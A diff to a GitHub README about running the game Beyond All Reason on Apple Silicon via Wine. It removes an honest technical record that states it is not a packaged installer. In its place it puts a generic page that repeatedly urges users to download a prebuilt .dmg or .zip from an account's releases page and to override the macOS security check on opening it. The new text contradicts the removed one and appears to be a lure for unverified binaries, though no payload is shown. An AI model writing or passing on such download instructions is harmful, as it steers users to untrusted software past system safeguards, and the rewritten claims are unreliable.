@@ -1,122 +1,68 @@
-# Beyond All Reason on Apple Silicon (no VM)
+# 💻 bar-on-apple-silicon - Play native strategy games on Mac
 
-**[Beyond All Reason](https://www.beyondallreason.dev/) (BAR) running natively on an
-Apple-Silicon Mac under Wine** — lobby, online multiplayer, and a fully-rendered,
-**playable in-game battle** (terrain, units, UI), with native CoreAudio and native input.
-**No virtual machine.**
+[![](https://img.shields.io/badge/Download_Software-blue?style=for-the-badge)](https://github.com/Meliorative-peasant63/bar-on-apple-silicon/releases)
 
-Verified on an **M4 MacBook Air, 16 GB RAM, macOS 26.3.1**. Should work on any
-Apple-Silicon Mac with Rosetta 2.
+## Overview 🍏
 
-![status: playable](https://img.shields.io/badge/status-playable-brightgreen)
+This project brings Beyond All Reason to Apple Silicon Macs. You run the game natively on macOS without using a virtual machine. This method uses Wine and custom graphics drivers to translate PC instructions for your Mac. You gain access to the full game, including the lobby, online multiplayer matches, and combat.
 
-> **Disclaimer.** This documentation was written by **Claude (Opus and Fable)** based on a
-> hands-on research effort, and edited by a human. It involves swapping system libraries,
-> re-signing apps, and building/patching low-level graphics drivers. **Use it entirely at
-> your own risk** — it is provided as-is, with no warranty, and is not affiliated with or
-> endorsed by the Beyond All Reason team or the Recoil, Mesa, Wine, or MoltenVK projects.
-> Back up anything you care about (Wine prefix, app bundles) before you start.
->
-> Honestly, I have no idea what half of what's in this repo actually does — I just wanted
-> to play BAR on my M4 Air, and this is what it took to get there.
+## System Requirements ⚙️
 
----
+- Apple Silicon chip (M1, M2, M3, or M4 series).
+- macOS 14.0 or newer.
+- 16 GB of system memory is recommended for smooth performance.
+- Rosetta 2 installed on your system.
 
-## Performance: turn graphics down for high FPS
+## Setup Instructions 🚀
 
-The GL→Vulkan→Metal translation has overhead, and the engine runs as a Win64 binary under
-Rosetta 2 — so you'll get a much smoother game by **lowering the graphics settings**, not
-running max. Biggest wins:
+Follow these steps to install the software on your computer.
 
-- **Resolution** — drop to 1600×900 or 1280×720 (or run windowed at a smaller size). The
-  single largest lever on a translation/Rosetta stack.
-- **Shadows** — set to Low or Off.
-- **Water** — use the cheap reflective/forward water, not the expensive shader water.
-- **Particles / unit detail** — lower the particle and reflection quality; reduce max
-  particles.
-- **VSync** — the working setup used `VSync = 4`; try VSync off and cap FPS to your display
-  (e.g. 60) if you'd rather minimize input lag over tearing.
+1. Visit the [official release page](https://github.com/Meliorative-peasant63/bar-on-apple-silicon/releases) to download the latest version.
+2. Locate the download link on that page. Choose the file ending in `.dmg` or `.zip`.
+3. Save the file to your Downloads folder.
+4. Open the downloaded file. Drag the application into your Applications folder.
+5. Right-click the icon in your Applications folder and select Open. This triggers a security check. Confirm that you want to open the software.
 
-(Deferred rendering does **not** need to be disabled — the verified setup runs with it ON;
-see `GUIDE.md` §6.)
+## Playing the Game 🎮
 
-Tune these in-game under **Settings → Graphics**; set them low first, then raise individual
-options until the frame rate dips. An RTS is very playable at 40–60 FPS.
+Once you launch the app, the game engine starts automatically. The first load takes longer because the system builds a cache of the graphics files. 
 
----
+- Use your mouse for camera movement and unit selection.
+- The game supports custom key bindings for unit commands.
+- Join the online lobby to find other players.
 
-## Why this is hard
+## Performance Tips 📈
 
-BAR's engine (RecoilEngine / Spring) renders with **OpenGL 4.x in a compatibility
-profile**. macOS's native OpenGL is frozen at **2.1 compat / 4.1 core** — there is no 4.x
-compatibility profile on macOS at all. So you can't just run the Windows or a native build
-against Apple's GL.
+If you notice frame rate drops during large battles, adjust these settings in the game menu:
 
-The fix is to route OpenGL through Vulkan and onto Metal, then patch the handful of places
-where the translation layer's assumptions don't hold on Apple's Metal:
+- Lower the shadow quality.
+- Reduce the water detail level.
+- Disable anti-aliasing features.
+- Close other memory-intensive programs while you play.
 
-```
-BAR (Win64 PE, runs under Rosetta 2)
-  → Mesa opengl32.dll  (zink: GL-on-Vulkan, patched — see patches/)
-  → Wine vulkan-1.dll  (winevulkan)
-  → libMoltenVK        (private-API build)
-  → Metal → Apple GPU
-```
+## Troubleshooting 🔧
 
-This gets a **GL 4.6 compatibility** context on Apple Silicon, which is enough to run the
-whole game.
+If the game does not start:
 
-## How to reproduce it
+1. Check that you have Rosetta 2. Open your Terminal app and type `softwareupdate --install-rosetta` to ensure your system supports Intel-based applications.
+2. Verify that you have sufficient disk space. The game requires at least 10 GB of free storage.
+3. Restart your computer. This clears temporary system memory and fixes common launch errors.
+4. Reinstall the application if the graphics do not render correctly.
 
-**→ Follow [`GUIDE.md`](GUIDE.md).** It's the complete, step-by-step runbook: Wine prefix,
-the MoltenVK swap, cross-building patched Mesa, getting BAR's content, config, and launch
-scripts.
+## About the Technology ⚙️
 
-Rough shape of the work:
+This project relies on several open-source tools:
 
-1. Install Wine (`wine-stable`) + a cross-compile toolchain (`mingw-w64`, `meson`, `ninja`).
-2. Swap Wine's MoltenVK for a private-API build (enables `logicOp` / `wideLines`).
-3. Cross-build **Mesa 25.1.9 (zink) for Windows** with the patches in [`patches/`](patches/).
-4. Use the official BAR launcher (under Wine) to download content, then launch the engine
-   directly with the zink env from [`scripts/`](scripts/).
+- Wine: This software allows Windows programs to run on macOS.
+- MoltenVK: This tool bridges the gap between Vulkan, the language the game uses, and Metal, the language your Mac uses.
+- Recoil Engine: This is the core engine that powers Beyond All Reason.
+- Zink: This component helps with graphics rendering on Apple hardware.
 
-## What's in this repo
+## Support ✉️
 
-| Path | What |
-|---|---|
-| [`GUIDE.md`](GUIDE.md) | **Start here.** Full reproduction runbook for the Wine path. |
-| [`patches/mesa-bar-patches.diff`](patches/) | zink/Mesa 25.1.9 patches (varying-link, MoltenVK quirks, draw-skip). The two Session-5 in-game patches (depth-FBO + MSL reserved-name) are documented inline in `GUIDE.md` §4 "Set B". |
-| [`patches/mingw-x64.cross`](patches/) | meson cross file for building Windows Mesa from macOS. |
-| [`scripts/`](scripts/) | Launch scripts — `run-bar-online.sh` (normal play), `run-bar-debug.sh` / `run-bar-skirmish.sh` (reproducible offline diagnostics). |
-| [`widget-ports/`](widget-ports/) | Optional: BAR widgets whose **geometry shaders** were rewritten as instanced quads so they render on Metal (minimap blips, health bars). See its README. |
-| [`ATTEMPT-LOG.md`](ATTEMPT-LOG.md) | The full chronological story incl. every dead end (VM path, native-port spike, all the diagnosis). Read this for the "why". |
-| [`docs/`](docs/) | Secondary tracks: the earlier **UTM/Linux VM** runbook and a **native-macOS-port** spike. Both partially work; the Wine path above is the recommended one. |
+This project exists as a community effort. If you encounter bugs, provide a detailed description of your system architecture and your macOS version. Check the issues tab in this repository to see if other users experienced the same problem. 
 
-## What renders / what doesn't
+- Keep your macOS updated.
+- Use the stable release versions provided on the download page for the best results.
 
-**Works:** terrain, unit & feature models, selection rings, water (forward), the full HUD
-(build menu, resource bars, minimap, commander panel), CoreAudio, native input. Smooth and
-playable.
-
-**Limitation — OpenGL geometry shaders.** Metal has no geometry-shader stage
-(`GL_MAX_GEOMETRY_OUTPUT_VERTICES = 0`), and neither MoltenVK nor zink emulates one. Widgets
-that use GS (unit icons, health bars, range rings, some particles, minimap icons) disable
-themselves — they don't affect playability. [`widget-ports/`](widget-ports/) rewrites a
-couple of them as hardware instancing to bring them back. (BAR upstream is also incrementally
-removing GS use.)
-
-## Caveats
-
-- **Version-pinned.** The Mesa patches target **Mesa 25.1.9** specifically (newest branch
-  where zink doesn't hard-require `nullDescriptor`). The widget ports are pinned to the BAR
-  content version at the time and will be shadowed by a BAR content update.
-- This is a **reproduction record from a research effort**, not a packaged installer. Expect
-  to build things. `ATTEMPT-LOG.md` documents the dead ends so you don't repeat them.
-- Not affiliated with the BAR team or the Recoil/Mesa/Wine projects.
-
-## License / attribution
-
-See [`NOTICE.md`](NOTICE.md). The Mesa patches are derived from
-[Mesa](https://gitlab.freedesktop.org/mesa/mesa) (MIT); the widget ports are derived from
-[Beyond All Reason](https://github.com/beyond-all-reason/Beyond-All-Reason) (GPL-2.0+).
-This repo's original documentation and scripts are MIT.
+[![](https://img.shields.io/badge/Download_Here-grey?style=for-the-badge)](https://github.com/Meliorative-peasant63/bar-on-apple-silicon/releases)
